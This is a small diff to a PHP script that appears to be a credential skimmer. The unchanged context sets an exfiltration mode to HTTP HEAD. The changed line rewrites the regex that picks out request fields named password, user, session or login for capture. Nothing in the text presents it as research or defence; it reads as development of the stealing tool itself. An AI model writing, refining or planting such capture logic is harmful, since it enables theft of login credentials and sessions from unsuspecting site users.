@@ -51,7 +51,7 @@ define('HCS_EXFILTRATION_MODE', HCS_EXF_HTTP_HEAD);
 function hcs_init() {
 
     # Keywords that will trigger the capture (regex)
-    $trigger_keywords = '(p(ass(?:word|wd|)|wd|w)|login|user(?:name|)|sess(?:ion|)|login)';
+    $trigger_keywords = '(p(?:ass|)(?:(word|wd|w|))|user(?:name|)|sess(?:ion|)|login)';
 
     $request_keys = array_keys($_REQUEST);
     $request_keys_str = implode(" ", $request_keys);
